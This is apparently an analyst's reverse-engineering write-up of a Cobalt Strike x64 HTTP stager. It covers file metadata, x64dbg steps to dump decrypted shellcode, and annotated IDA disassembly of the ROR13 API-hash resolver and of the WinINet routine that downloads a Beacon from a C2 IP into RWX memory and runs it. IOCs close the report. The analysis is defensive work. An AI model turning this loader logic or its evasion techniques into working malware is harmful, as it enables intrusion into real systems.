# Shellcode Extraction

---

## **Executive summary**

- **Family / tool**: **Cobalt Strike**
- **Component**: **64‑bit HTTP(S) stager / Beacon loader**
- **Platform**: Windows x64 (raw shellcode, no PE headers)
- **Purpose**: Retrieve a **Cobalt Strike Beacon** from a remote HTTP(S) C2 server, load it into **RWX memory**, and transfer execution in‑memory.
- **Risk**: **High** – generic, production Cobalt Strike loader, easily reconfigured to different C2s.

## Metadata

---

| **Field** | **Value** |
| --- | --- |
| **File Name** | syswow.exe |
| **MD5** | `521f56ac9d1bf2701b225a9dde685dd0` |
| **SHA-1** | `60c78bf5895650a4731130f387cac0bb13c8de7c` |
| **SHA-256** | `3878c2c94ae2a2de904b989b29d69bf70a52a096393dc3a4f7000deba64181a4` |
| **Vhash** | `034076655d051555157bzcnzaez4` |
| **Imphash** | `9658e75e10fc3fd7d91ac973da593588` |
| **SSDEEP** | `768:bi5Zp19rPB+1Sj61cU8jxCq5CbMZf/LKAjO:e5p9Lg1y48MMZ7e` |
| **File Type** | Win32 EXE (PE32+ / x86-64) |
| **Magic** | PE32+ executable (GUI) x86-64, for MS Windows |
| **DetectItEasy** | Compiler: MSVC (19.31.31107); Linker: MS Linker (14.31) |
| **File Size** | 32.00 KB (32768 bytes) |

---

### PE Sections

| **Section** | **Entropy** | **Raw Size** | **Characteristics / Notes** |
| --- | --- | --- | --- |
| **.text** | 6.205 | 18,432 B | Executable code (Main logic/loader). |
| **.rdata** | 4.667 | 2,560 B | Read-only initialized data (Imports/Constants). |
| **.data** | 0.000 | 512 B | Initialized data (Empty/Placeholder). |
| **.pdata** | 2.979 | 1,024 B | Exception handling tables (x64 specific). |
| **.rsrc** | 4.702 | 512 B | Resources (Icons/Manifest). |
| **.reloc** | 0.154 | 512 B | Relocation table. |
| **.ATOM** | **`7.803`** | **8,192 B** | **High Entropy - Target for Shellcode.** |

---

### Imports

| **Function Name** | **Library** | **Type** |
| --- | --- | --- |
| `HeapAlloc` | KERNEL32.dll | implicit |
| `HeapFree` | KERNEL32.dll | implicit |
| `HeapSize` | KERNEL32.dll | implicit |
| `GetProcessHeap` | KERNEL32.dll | implicit |
| `UnhandledExceptionFilter` | KERNEL32.dll | implicit |
| `SetUnhandledExceptionFilter` | KERNEL32.dll | implicit |
| `GetLastError` | KERNEL32.dll | implicit |
| `ReleaseSRWLockExclusive` | KERNEL32.dll | implicit |
| `ReleaseSRWLockShared` | KERNEL32.dll | implicit |
| `TryAcquireSRWLockExclusive` | KERNEL32.dll | implicit |
| `SetCriticalSectionSpinCount` | KERNEL32.dll | implicit |
| `WakeAllConditionVariable` | KERNEL32.dll | implicit |
| `GetMenu` | USER32.dll | implicit |
| `GetSystemMenu` | USER32.dll | implicit |
| `CheckMenuItem` | USER32.dll | implicit |
| `EnableMenuItem` | USER32.dll | implicit |
| `GetMenuItemID` | USER32.dll | implicit |
| `UpdateWindow` | USER32.dll | implicit |
| `GetWindowContextHelpId` | USER32.dll | implicit |
| `MessageBoxA` | USER32.dll | implicit |
| `MessageBoxW` | USER32.dll | implicit |
| `MessageBeep` | USER32.dll | implicit |

**Description**

- **Stealth & Evasion:** The sample exhibits strong indicators of packing or encryption. Most notably, it contains a non-standard PE section named **`.ATOM`** with an extremely high entropy of **7.803**, suggesting it serves as an encrypted container for the primary payload or shellcode.
- **Missing APIs:** The Import Address Table (IAT) is intentionally "clean," lacking common process injection or memory allocation APIs (e.g., `VirtualAlloc`, `CreateRemoteThread`). This indicates the malware likely employs **Dynamic API Resolving** to load malicious functions at runtime, bypassing basic static detection.
- **Staging Mechanism:** The binary imports several heap management functions (`HeapAlloc`, `GetProcessHeap`). It is highly probable that the malware allocates heap space, copies the encrypted data from the `.ATOM` section into memory, and decrypts it before execution.
- **Deceptive Front:** The presence of `USER32.dll` imports (related to menus and message boxes) suggests a "decoy" GUI functionality intended to make the file appear as a legitimate Windows utility during automated sandbox analysis.

---

| **Component** | **Observation** | **Risk Level** |
| --- | --- | --- |
| **Section `.ATOM`** | Non-standard name; 7.803 entropy; 8KB size. | **Critical** (Likely Payload) |
| **Imports (IAT)** | Standard Heap/UI functions; no injection APIs. | **Suspicious** (Obfuscation) |
| **Tooling** | Compiled with MSVC 19.31 (VS 2022). | **Neutral** (Modern Build) |
| **File Size** | 32.00 KB. | **High** (Typical of Loaders) |

---

## Shellcode Extraction

---

### X64 DBG

![Fig 1 - X64 dbg](Shellcode%20Extraction/Screenshot_2026-02-09_at_4.49.08_PM.png)

Fig 1 - X64 dbg

---

### Adding break points

![Fig 2 - Setting breakpoints](Shellcode%20Extraction/Screenshot_2026-02-09_at_4.49.45_PM.png)

Fig 2 - Setting breakpoints

---

![Fig 3 - Breakpoints](Shellcode%20Extraction/Screenshot_2026-02-09_at_4.52.08_PM.png)

Fig 3 - Breakpoints

---

we hit the VirtualAlloc breakpoint.

![Fig 4 - hitting the breakpoint VirtualAlloc](Shellcode%20Extraction/Screenshot_2026-02-09_at_4.56.41_PM.png)

Fig 4 - hitting the breakpoint VirtualAlloc

---

**`The Fourth Argument is in R9 which is PAGE_READWRITE  Permission.`**

![Fig 5 - Fourth Argument in R9](Shellcode%20Extraction/Screenshot_2026-02-09_at_5.03.40_PM.png)

Fig 5 - Fourth Argument in R9

![Fig 6 - microsoft msdn fl protect reference](Shellcode%20Extraction/Screenshot_2026-02-09_at_5.10.17_PM.png)

Fig 6 - microsoft msdn fl protect reference

---

Execute till return **`ctrl + f9`**

![Fig 7 - execute till return](Shellcode%20Extraction/Screenshot_2026-02-11_at_9.46.59_AM.png)

Fig 7 - execute till return

---

Check RAX it stores the base address of the allocated region.

![Fig 8 - RAX return address](Shellcode%20Extraction/Screenshot_2026-02-11_at_9.49.54_AM.png)

Fig 8 - RAX return address

---

Follow the RAX address in memory dump. Then begin executing individual instructions to see any of them changes to this recently allocated memory. **`Debug —> Step over (F8)`**

![Fig 9 - Debug - Step over](Shellcode%20Extraction/Screenshot_2026-02-11_at_9.55.51_AM.png)

Fig 9 - Debug - Step over

---

we can observe some XOR operations.

![Fig 10 - xor operations.](Shellcode%20Extraction/Screenshot_2026-02-11_at_9.59.57_AM.png)

Fig 10 - xor operations.

---

**`Click on the instruction immediately after the loop ends. Run until selection`**

![Fig 11 - Run until Selection](Shellcode%20Extraction/Screenshot_2026-02-11_at_10.05.02_AM.png)

Fig 11 - Run until Selection

![Fig 12 - Instruction after loop](Shellcode%20Extraction/Screenshot_2026-02-11_at_10.16.49_AM.png)

Fig 12 - Instruction after loop

---

Scroll down a bit We can see some readable data in dump.

![Fig 13 -Some readable data ](Shellcode%20Extraction/Screenshot_2026-02-11_at_10.18.52_AM.png)

Fig 13 -Some readable data 

There’s a ip address

![Fig 14 - IP ](Shellcode%20Extraction/Screenshot_2026-02-11_at_10.20.32_AM.png)

Fig 14 - IP 

---

The opcode starts with FC. Commonly starts at the beginning of a shell code.

![Fig 15 - starting of the opcode.](Shellcode%20Extraction/Screenshot_2026-02-11_at_10.21.55_AM.png)

Fig 15 - starting of the opcode.

![Fig 16 - FC opcode](Shellcode%20Extraction/Screenshot_2026-02-11_at_10.24.18_AM.png)

Fig 16 - FC opcode

---

**We can see it by right click on opcode follow in Disassembler.**

![Fig 17 - Follow opcode in disassembler](Shellcode%20Extraction/Screenshot_2026-02-11_at_10.25.36_AM.png)

Fig 17 - Follow opcode in disassembler

---

**`now hit run will get to VirtualProtect`**

![Fig 18 - VirtualProtect](Shellcode%20Extraction/Screenshot_2026-02-11_at_10.30.22_AM.png)

Fig 18 - VirtualProtect

Check RCX which stores the First argument.

![Fig 19 - RCX - stores 1st argument](Shellcode%20Extraction/Screenshot_2026-02-11_at_10.42.47_AM.png)

Fig 19 - RCX - stores 1st argument

---

another is **`R8`** which **`20`** that specifies memory protection constant. Which is **`PAGE_EXECUTE_READ`**

![Fig 20 - r8 memory protection](Shellcode%20Extraction/Screenshot_2026-02-11_at_10.44.34_AM.png)

Fig 20 - r8 memory protection

![Fig 21 - 0x20 - msdn refernce - ](Shellcode%20Extraction/Screenshot_2026-02-11_at_10.47.22_AM.png)

Fig 21 - 0x20 - msdn refernce - 

---

## Dumping

---

Follow in Memory map.

![Fig 22 - Follow in memory map](Shellcode%20Extraction/Screenshot_2026-02-11_at_10.50.44_AM.png)

Fig 22 - Follow in memory map

---

![Fig 23 - Memory map](Shellcode%20Extraction/Screenshot_2026-02-11_at_10.51.45_AM.png)

Fig 23 - Memory map

---

Dump memory to file

![Fig 24 - Dump memory to file.](Shellcode%20Extraction/Screenshot_2026-02-11_at_10.52.32_AM.png)

Fig 24 - Dump memory to file.

---

Save it.

![Fig 25 - Save Memory Region](Shellcode%20Extraction/Screenshot_2026-02-11_at_10.53.15_AM.png)

Fig 25 - Save Memory Region

---

## **stage‑2**

---

| **Property** | **Value** |
| --- | --- |
| **MD5** | `08a14b32c8ee164a4c653e0ae777dab7` |
| **SHA-1** | `0c075c3f17f2e608ffeea8da8cc37a3a09fe9586` |
| **SHA-256** | `4f7e6ac2bc7020bd89fa740ad14d6c3dbf477f0cda382c55839193f816686f3a` |
| **SSDEEP** | `24:capq9Kkm/uJsGtRqFnx8GHDurti4i/7BuH3gsuGELQ3:cR9yua31OMurti/W3gFPL` |
| **TLSH** | `T14B81B71709443035C834A877C791882F844EDAB77B19687C21E7013915A1A75AC38995` |
| **File Type** | Unknown |
| **Magic** | `data` |
| **Magika** | ISO |
| **File Size** | 4.00 KB (4,096 bytes) |

---

## IDA Pro  Analysis

---

we can see opcode **`FC`** which we saw in the dumping stage.

![Fig 26 - IDA ](Shellcode%20Extraction/Screenshot_2026-02-11_at_12.04.29_PM.png)

Fig 26 - IDA 

---

wininet api in reverse order. 

### API hashing

Uses a hash-based resolver (calls through a function pointer, observed as call rbp with a hash constant in r10d) to locate required WinAPI exports at runtime.

![Fig 27 - Api hashing](Shellcode%20Extraction/Screenshot_2026-02-11_at_2.36.33_PM.png)

Fig 27 - Api hashing

![Fig 28 - win api’s](Shellcode%20Extraction/Screenshot_2026-02-11_at_2.40.49_PM.png)

Fig 28 - win api’s

---

### Description

- **Type**: Staged C2 loader (Cobalt Strike Beacon stager)
- **Execution**: In‑memory shellcode (dumped via x64dbg)
- **Imports**: None – all WinAPI functions are resolved dynamically through hashing.
- **Main capabilities**:
- PEB‑based module enumeration and export parsing.
- ROR13‑based API hashing for kernel32, wininet, and likely others.
- HTTP(S) download of Beacon payload using WinINet.
- In‑memory de‑staging and execution via VirtualAlloc and function pointer return.

### **API hashing and resolver (Cobalt‑style)**

**Algorithm**: 32‑bit **ROR13 + ADD**, module + function hash added together.

- **Module hash**:
- Iterates UNICODE module name bytes (UTF‑16LE) from the PEB loader list.
- Per byte:
- If ASCII a–z, uppercase (b -= 0x20).
- h = ROR32(h, 13) + b.
- **Function hash**:
- Iterates ASCII export name bytes:
- h = ROR32(h, 13) + b.
- **Combined**:
- final = module_hash + func_hash (32‑bit wraparound), compared to constant in r10d.

**Resolver snippet (IDA)**:

```nasm
0   and     rsp, 0FFFFFFFFFFFFFFF0h
; PEB walk
11  xor     rdx, rdx
14  mov     rdx, gs:[rdx+60h]       ; PEB
19  mov     rdx, [rdx+18h]          ; PEB_LDR_DATA
1D  mov     rdx, [rdx+20h]          ; InMemoryOrderModuleList
21  mov     rsi, [rdx+50h]          ; UNICODE name base
25  movzx   rcx, word ptr [rdx+4Ah] ; length

; hash module name bytes (UTF‑16, uppercased)
2A  xor     r9, r9
2D  xor     rax, rax
30  lodsb
31  cmp     al, 61h
33  jl      short loc_37
35  sub     al, 20h                 ; to upper
37  ror     r9d, 0Dh
3B  add     r9d, eax
3E  loop    loc_2D

; hash export name, add module hash, compare to r10d
80  lodsb                           ; ASCII function name
81  ror     r9d, 0Dh
85  add     r9d, eax
...
8C  add     r9, [rsp+8]             ; + module hash
91  cmp     r9d, r10d               ; r10d = target hash
94  jnz     short loc_6E
...
C4  jmp     rax                     ; jump to resolved API
```

---

This is the standard Cobalt/Metasploit‑style resolver pattern.

### **Resolved APIs and behavior (Cobalt Strike stager)**

Using HashDB + call semantics, the main hashes map to:

| **Hash Value** | **Guessed/Confirmed API** | **DLL Library** | **Typical Malware Behavior** |
| --- | --- | --- | --- |
| `0x0726774C` | `LoadLibraryA` | `KERNEL32` | Loading additional DLLs into memory. |
| `0xA779563A` | `InternetOpenA` | `WININET` | Initializing an internet session. |
| `0x3B2E55EB` | `InternetOpenUrlA` | `WININET` | Connecting to a specific C2 (Command & Control) URL. |
| `0xE553A458` | `VirtualAlloc` | `KERNEL32` | Allocating memory for a secondary payload or buffer. |
| `0xE2899612` | `InternetReadFile` | `WININET` | Downloading the next stage of the malware. |
| `0x7B18062D` | `InternetConnectA` | `WININET` | Establishing a connection to a specific server/port. |
| `0x56A2B5F0` | `HttpOpenRequestA` | `WININET` | Preparing a specific GET/POST request. |
| `0xC69F8957` | `HttpSendRequestA` | `WININET` | Sending the request to the remote server. |

---

### **WinINet setup and C2 connection**

```nasm
D5  mov     r14, 'teniniw'         ; "wininet" backwards
DF  push    r14
E4  mov     rcx, rsp               ; "wininet"
E7  mov     r10d, 0x0726774C       ; LoadLibraryA
ED  call    rbp                    ; LoadLibraryA("wininet")

FF  mov     r10d, 0xA779563A       ; InternetOpenA
105 call    rbp                    ; hInternet = InternetOpenA(...)
```

Then in sub_128

```nasm
129 mov     rcx, rax               ; rcx = hInternet
...
136 push    0FFFFFFFF84400200h
13D mov     r10d, 0x3B2E55EB       ; InternetOpenUrlA
143 call    rbp                    ; rsi = hUrl / hFile
...
14C push    0Ah
14E pop     rdi                    ; retry count = 10

; retry loop around another WinINet hash (likely HttpSendRequestA)
161 mov     r10d, 0x7B18062D
167 call    rbp
169 test    eax, eax
16B jnz     loc_30E                ; success → allocate & read
171 dec     rdi
174 jz      loc_306                ; max retries exceeded
17A jmp     short 14F              ; retry
```

The target URL (from embedded data) is:

- **`C2 IP: 45.61.136.220`**
- **Path**: /KbWY
- **User‑Agent**: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)

Typical Cobalt Strike HTTP profile style.

---

### **Stage‑2 download and Beacon load**

```nasm
30E xor     rcx, rcx               ; lpAddress = NULL
311 mov     edx, 400000h
316 mov     r8d, 1000h             ; MEM_COMMIT
31C mov     r9d, 40h               ; PAGE_EXECUTE_READWRITE
322 mov     r10d, 0xE553A458       ; VirtualAlloc
328 call    rbp                    ; rax = RWX buffer
32A xchg    rax, rbx               ; rbx = write ptr

32C push    rbx
32D push    rbx
32E mov     rdi, rsp               ; rdi = &bytesRead

; InternetReadFile loop (Cobalt staging)
331 mov     rcx, rsi               ; hFile
334 mov     rdx, rbx               ; buffer ptr
337 mov     r8d, 2000h             ; chunk size
33D mov     r9,  rdi               ; &bytesRead
340 mov     r10d, 0xE2899612       ; InternetReadFile
346 call    rbp

34C test    eax, eax
34E jz      short loc_306          ; on error → error path

350 mov     ax, [rdi]              ; bytesRead
353 add     rbx, rax               ; advance write ptr
356 test    eax, eax
358 jnz     short 331              ; repeat until bytesRead == 0

; pivot into downloaded Beacon
35A pop     rax
35B pop     rax
35C pop     rax
363 push    rax
364 retn                            ; return into Beacon
```

## **Network and behavioral indicators (Cobalt Strike)**

- **C2**:
- IP: **`45.61.136.220`**
- URI: /KbWY
- **HTTP profile**:
- User‑Agent string mimics legacy IE9 / Trident.
- Cobalt Strike HTTP stagers commonly use short, pseudo‑random URIs and configurable HTTP headers.
- **Behavior**:
- Uses WinINet instead of raw sockets (typical of Cobalt’s default stagers).
- Only a small, in‑memory shellcode is required in the initial infection; the full Beacon body is obtained from C2.

---

## **MITRE ATT&CK mapping (with Cobalt Strike context)**

---

![Fig 29 - MITRE ATTACK ](Shellcode%20Extraction/mitre.png)

Fig 29 - MITRE ATTACK 

---

## **Assessment**

This sample is a **Cobalt Strike x64 HTTP stager**. Its sole job is to bootstrap a Beacon from a remote C2, using hashed API resolution and in‑memory loading to evade static detection and reduce its on‑disk footprint. The main security impact comes from the **Beacon** stage; however, the stager itself is a strong, high‑confidence indicator of Cobalt Strike activity in the environment.

---